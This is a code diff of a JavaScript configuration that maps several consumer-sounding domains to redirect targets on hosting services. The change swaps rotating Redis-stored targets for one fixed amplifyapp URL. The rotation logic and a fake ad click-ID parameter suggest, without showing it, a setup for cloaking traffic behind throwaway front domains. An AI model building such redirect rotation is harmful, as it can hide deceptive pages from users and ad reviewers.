@@ -108,9 +108,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.dsv90wl51crh6.amplifyapp.com"},
-    "https://teruogames.org": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
-    "https://takahirofoodfarm.shop": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.dsv90wl51crh6.amplifyapp.com" },
+    "https://teruogames.org": { method: "redirect", target: "https://main.dsv90wl51crh6.amplifyapp.com" },
+    "https://takahirofoodfarm.shop": { method: "redirect", target: "https://main.dsv90wl51crh6.amplifyapp.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
@@ -119,8 +119,8 @@ const ORIGIN_GROUPS = {
     // "https://onsen-meitado.netlify.app": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
   },
   aomine: {
-    "https://seijakublessings.life": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
-    "https://gleaming-llama-0041e0.netlify.app": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
+    "https://seijakublessings.life": { method: "redirect", target: "https://main.dsv90wl51crh6.amplifyapp.com" },
+    "https://gleaming-llama-0041e0.netlify.app": { method: "redirect", target: "https://main.dsv90wl51crh6.amplifyapp.com" },
   },
 };
 
